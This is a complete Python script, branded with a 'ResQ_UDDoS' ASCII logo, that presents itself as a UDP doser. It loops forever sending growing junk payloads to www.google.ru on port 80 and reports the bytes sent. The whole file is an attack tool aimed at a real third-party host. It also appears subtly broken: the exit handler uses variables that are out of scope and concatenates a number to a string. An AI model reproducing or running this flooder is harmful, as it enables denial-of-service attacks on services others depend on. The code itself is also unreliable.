try:
	import socks
	from time import sleep
	from threading import Thread
	sock = socks.socks()
	def main():
		W  = '\033[0m'  # white (normal)
		R  = '\033[31m' # red
		G  = '\033[32m' # green
		O  = '\033[33m' # orange
		B  = '\033[34m' # blue
		P  = '\033[35m' # purple
		logo = """
	 	 ____            ___     _   _ ____       ____  
		|  _ \ ___  ___ / _ \   | | | |  _ \  ___/ ___| 
		| |_) / _ \/ __| | | |  | | | | | | |/ _ \___ \ 
		|  _ <  __/\__ \ |_| |  | |_| | |_| | (_) |__) |
		|_| \_\___||___/\__\_\___\___/|____/ \___/____/ 
	                    |_____|                     
		"""
		print(O+logo+W)
		print(B+"[*]"+R+" Starting UDP doser"+W)
		sleep(4)
		
		ran = ""
		while True:
			ran += "x"
			try:
				sock.send(ran, sock.gethostip('www.google.ru'), 80)
			except OSError:
				print(R+"[-]"+B+"Error sending packet"+W)
				ran = ran[0:100000]
			else:
				print(O+"[^]"+G+"bytes sended "+B+str(sock.counter)+W+" for protocol "+R+"UDP"+W)
	th = Thread(target=main, name='startmain')
	th.start()
	th.join()
except KeyboardInterrupt:
	print(R+"[-]Program finishing, packets sended - "+G+sock.counter+W)
	exit()